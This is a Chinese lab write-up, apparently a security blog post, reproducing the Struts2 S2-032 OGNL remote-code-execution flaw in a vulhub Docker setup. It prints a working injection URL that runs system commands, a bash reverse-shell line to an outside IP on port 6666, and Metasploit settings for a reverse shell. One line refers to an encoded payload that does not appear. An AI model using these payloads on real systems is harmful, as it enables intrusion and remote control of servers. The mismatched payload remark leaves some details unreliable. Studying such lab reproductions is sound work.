ailx10说：这篇是2024年9月之前写的，后来又改过。这篇我同时试了手工请求和 Metasploit。S2-032 的入口在动态方法调用的 method 前缀里，表达式本身又从另外的参数取命令，拆开看比一整段编码容易理解。我先确认能得到输出，再接连接，把两种操作都记在笔记里。做这组实验越多，我越觉得先决条件不能省：动态方法调用有没有开启，决定了这条路是不是存在。至于一长串转义和编码，得回到实际请求逐层看，不能只看页面上打印出来的样子。

---

原案例依赖启用动态方法调用（DMI），method 前缀处理时发生表达式求值。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build` `//可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

实验结束后在确认项目目录和 Compose 配置后关闭本项目服务；原文中的全局 Docker 清理命令已移除。

简单访问一下，说明 Struts2 S2-032 远程代码执行漏洞 环境搭建成功了

（1）命令执行

```
/index.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString&pp=\A&ppp= &encoding=UTF-8&cmd=id
```

（2）反弹shell

```
/bin/bash -c bash$IFS$9-i>&/dev/tcp/144.34.162.13/6666<&1
```

以下保留原编码载荷；其中 Scanner 分隔符转写存在反斜杠差异，必须与实际字节和 Java 表达式核对。

（3）使用 Metasploit 直接进行反弹shell

```
use exploit/multi/http/struts_dmi_exec



set payload payload/generic/shell_reverse_tcp

set target 1 (Linux 系统)

set LPORT 6666

set RHOSTS 144.34.162.13

set TARGETURI /index.action
```
